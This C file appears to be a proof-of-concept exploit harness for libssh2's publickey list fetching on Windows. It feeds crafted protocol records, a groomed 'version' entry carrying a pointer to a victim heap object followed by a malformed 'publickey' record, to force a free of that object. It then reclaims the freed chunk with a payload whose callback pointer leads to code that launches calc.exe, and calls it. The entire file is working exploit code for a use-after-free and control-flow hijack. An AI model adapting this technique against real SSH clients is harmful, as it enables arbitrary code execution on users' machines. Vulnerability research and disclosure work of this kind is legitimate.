#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libssh2_priv.h"
#include "libssh2_publickey.h"
#include "channel.h"

struct victim {
    void (*cb)(void);
    unsigned char pad[120];
};

#define MAX_RECORDS 8192

struct alloc_record {
    void *ptr;
    int live;
};

static HANDLE app_heap;
static unsigned char wire[131072];
static size_t wire_len;
static size_t wire_off;
static struct victim *stale_victim;
static void *small_guard;
static int victim_freed;
static int launch_real_calc;
static unsigned long heap_free_failures;
static struct alloc_record records[MAX_RECORDS];

static void track_ptr(void *ptr)
{
    size_t i;
    if(!ptr)
        return;
    for(i = 0; i < MAX_RECORDS; i++) {
        if(!records[i].live) {
            records[i].ptr = ptr;
            records[i].live = 1;
            return;
        }
    }
}

static int untrack_ptr(void *ptr)
{
    size_t i;
    for(i = 0; i < MAX_RECORDS; i++) {
        if(records[i].live && records[i].ptr == ptr) {
            records[i].live = 0;
            return 1;
        }
    }
    return 0;
}

static void safe_callback(void)
{
    fprintf(stderr, "safe_callback_reached\n");
}

static void launch_calc_callback(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[] = "calc.exe";
    FILE *f = fopen("x64_calc_payload_reached.txt", "wb");

    if(f) {
        fputs("x64 calc payload reached\n", f);
        fclose(f);
    }

    fprintf(stderr, "calc_payload_reached callback=%p\n",
            launch_calc_callback);

    if(launch_real_calc) {
        memset(&si, 0, sizeof(si));
        memset(&pi, 0, sizeof(pi));
        si.cb = sizeof(si);
        if(CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL,
                          &si, &pi)) {
            fprintf(stderr, "calc_launch=success pid=%lu\n",
                    (unsigned long)pi.dwProcessId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        else {
            fprintf(stderr, "calc_launch=failed error=%lu\n",
                    (unsigned long)GetLastError());
            ExitProcess(78);
        }
    }

    ExitProcess(77);
}

static void *app_alloc_raw(size_t size)
{
    void *ptr = HeapAlloc(app_heap, 0, size ? size : 1);
    track_ptr(ptr);
    return ptr;
}

static void app_free_raw(void *ptr)
{
    if(ptr) {
        if(!untrack_ptr(ptr)) {
            heap_free_failures++;
            fprintf(stderr, "free_ignored_unknown ptr=%p\n", ptr);
            return;
        }
        if(HeapFree(app_heap, 0, ptr)) {
            if(ptr == stale_victim)
                victim_freed = 1;
        }
        else {
            heap_free_failures++;
            fprintf(stderr, "heap_free_failed ptr=%p error=%lu\n", ptr,
                    (unsigned long)GetLastError());
        }
    }
}

static LIBSSH2_ALLOC_FUNC(app_alloc)
{
    void *ptr;
    (void)abstract;
    ptr = app_alloc_raw(count);
    fprintf(stderr, "alloc size=%llu ptr=%p\n",
            (unsigned long long)(count ? count : 1), ptr);
    return ptr;
}

static LIBSSH2_FREE_FUNC(app_free)
{
    (void)abstract;
    fprintf(stderr, "free ptr=%p\n", ptr);
    app_free_raw(ptr);
}

static LIBSSH2_REALLOC_FUNC(app_realloc)
{
    void *newptr;
    (void)abstract;
    if(!ptr)
        return app_alloc(count, abstract);
    newptr = HeapReAlloc(app_heap, 0, ptr, count ? count : 1);
    if(newptr) {
        untrack_ptr(ptr);
        track_ptr(newptr);
    }
    fprintf(stderr, "realloc old=%p size=%llu new=%p\n", ptr,
            (unsigned long long)(count ? count : 1), newptr);
    return newptr;
}

int ssh2_err(LIBSSH2_SESSION *session, int errcode, const char *errmsg)
{
    if(session) {
        session->err_code = errcode;
        session->err_msg = (char *)errmsg;
    }
    return errcode;
}

int ssh2_err_flags(LIBSSH2_SESSION *session, int errcode, const char *errmsg,
                   int errflags)
{
    (void)errflags;
    return ssh2_err(session, errcode, errmsg);
}

uint32_t ssh2_ntohu32(const unsigned char *buf)
{
    return ((uint32_t)buf[0] << 24) | ((uint32_t)buf[1] << 16) |
        ((uint32_t)buf[2] << 8) | (uint32_t)buf[3];
}

void ssh2_htonu32(unsigned char *buf, uint32_t value)
{
    buf[0] = (unsigned char)(value >> 24);
    buf[1] = (unsigned char)(value >> 16);
    buf[2] = (unsigned char)(value >> 8);
    buf[3] = (unsigned char)value;
}

void ssh2_store_u32(unsigned char **buf, uint32_t value)
{
    ssh2_htonu32(*buf, value);
    *buf += 4;
}

int ssh2_store_str(unsigned char **buf, const char *str, size_t len)
{
    ssh2_store_u32(buf, (uint32_t)len);
    memcpy(*buf, str, len);
    *buf += len;
    return 0;
}

ssize_t ssh2_channel_write(LIBSSH2_CHANNEL *channel, int stream_id,
                           const unsigned char *buf, size_t buflen)
{
    (void)channel;
    (void)stream_id;
    (void)buf;
    return (ssize_t)buflen;
}

ssize_t ssh2_channel_read(LIBSSH2_CHANNEL *channel, int stream_id,
                          char *buf, size_t buflen)
{
    (void)channel;
    (void)stream_id;
    if(wire_off + buflen > wire_len)
        return -1;
    memcpy(buf, wire + wire_off, buflen);
    wire_off += buflen;
    return (ssize_t)buflen;
}

int ssh2_channel_free(LIBSSH2_CHANNEL *channel)
{
    (void)channel;
    return 0;
}

int ssh2_channel_close(LIBSSH2_CHANNEL *channel)
{
    (void)channel;
    return 0;
}

int libssh2_session_last_errno(LIBSSH2_SESSION *session)
{
    return session ? session->err_code : 0;
}

int ssh2_wait_socket(LIBSSH2_SESSION *session, time_t start_time)
{
    (void)session;
    (void)start_time;
    return 0;
}

LIBSSH2_CHANNEL *ssh2_channel_open(LIBSSH2_SESSION *session,
                                   const char *channel_type,
                                   uint32_t channel_type_len,
                                   uint32_t window_size,
                                   uint32_t packet_size,
                                   const unsigned char *message,
                                   size_t message_len)
{
    (void)session;
    (void)channel_type;
    (void)channel_type_len;
    (void)window_size;
    (void)packet_size;
    (void)message;
    (void)message_len;
    return NULL;
}

int ssh2_channel_process_startup(LIBSSH2_CHANNEL *channel,
                                 const char *request, size_t request_len,
                                 const char *message, size_t message_len)
{
    (void)channel;
    (void)request;
    (void)request_len;
    (void)message;
    (void)message_len;
    return LIBSSH2_ERROR_SOCKET_NONE;
}

int ssh2_channel_extended_data(LIBSSH2_CHANNEL *channel, int ignore_mode)
{
    (void)channel;
    (void)ignore_mode;
    return 0;
}

void *ssh2_calloc(LIBSSH2_SESSION *session, size_t size)
{
    void *ptr = app_alloc(size, session ? session->abstract : NULL);
    if(ptr)
        memset(ptr, 0, size);
    return ptr;
}

static unsigned char *put_string(unsigned char *p, const char *s)
{
    size_t len = strlen(s);
    ssh2_store_u32(&p, (uint32_t)len);
    memcpy(p, s, len);
    return p + len;
}

static void append_version_groom(uintptr_t attrs_ptr)
{
    size_t payload_len = 9 * sizeof(libssh2_publickey_list);
    unsigned char *start = wire + wire_len;
    unsigned char *payload = start + 4;
    unsigned char *p;

    ssh2_htonu32(start, (uint32_t)payload_len);
    memset(payload, 0, payload_len);
    p = put_string(payload, "version");
    memset(p, 0, payload_len - (size_t)(p - payload));
    memcpy(payload + offsetof(libssh2_publickey_list, attrs),
           &attrs_ptr, sizeof(attrs_ptr));
    wire_len += 4 + payload_len;
}

static void append_malformed_publickey(void)
{
    unsigned char payload[64];
    unsigned char *p = payload;

    p = put_string(p, "publickey");
    p = put_string(p, "n");
    *p++ = 0;
    ssh2_htonu32(wire + wire_len, (uint32_t)(p - payload));
    memcpy(wire + wire_len + 4, payload, (size_t)(p - payload));
    wire_len += 4 + (size_t)(p - payload);
}

static int run_once(void)
{
    LIBSSH2_SESSION session;
    LIBSSH2_CHANNEL channel;
    LIBSSH2_PUBLICKEY pkey;
    libssh2_publickey_list *list = NULL;
    unsigned long num_keys = 0;
    struct victim payload;
    struct victim *replacement;
    int rc;

    memset(&session, 0, sizeof(session));
    memset(&channel, 0, sizeof(channel));
    memset(&pkey, 0, sizeof(pkey));
    memset(&payload, 0x43, sizeof(payload));

    stale_victim = app_alloc_raw(sizeof(*stale_victim));
    if(!stale_victim)
        return 70;
    memset(stale_victim, 0x42, sizeof(*stale_victim));
    stale_victim->cb = safe_callback;

    payload.cb = launch_calc_callback;

    fprintf(stderr,
            "victim=%p victim_size=%llu replacement_callback=%p list_entry_size=%llu attrs_off=%llu\n",
            stale_victim, (unsigned long long)sizeof(*stale_victim),
            launch_calc_callback,
            (unsigned long long)sizeof(libssh2_publickey_list),
            (unsigned long long)offsetof(libssh2_publickey_list, attrs));

    {
        void *small_prime = app_alloc_raw(19);
        small_guard = app_alloc_raw(64);
        fprintf(stderr, "small_prime=%p size=19 small_guard=%p size=64\n",
                small_prime, small_guard);
        app_free_raw(small_prime);
    }

    session.alloc = app_alloc;
    session.free = app_free;
    session.realloc = app_realloc;
    channel.session = &session;
    pkey.channel = &channel;
    pkey.version = 2;

    append_version_groom((uintptr_t)stale_victim);
    append_malformed_publickey();

    rc = libssh2_publickey_list_fetch(&pkey, &num_keys, &list);
    fprintf(stderr,
            "fetch rc=%d num_keys=%lu victim_freed=%d heap_free_failures=%lu\n",
            rc, num_keys, victim_freed, heap_free_failures);

    replacement = app_alloc_raw(sizeof(*replacement));
    fprintf(stderr, "replacement=%p same_as_victim=%d\n", replacement,
            replacement == stale_victim);
    if(replacement)
        memcpy(replacement, &payload, sizeof(payload));

    fprintf(stderr, "triggering_stale_callback cb=%p\n", stale_victim->cb);
    stale_victim->cb();

    return victim_freed ? 2 : 0;
}

int main(int argc, char **argv)
{
    if(argc > 1 && !strcmp(argv[1], "calc"))
        launch_real_calc = 1;

    app_heap = HeapCreate(0, 0, 0);
    if(!app_heap)
        return 69;

    return run_once();
}
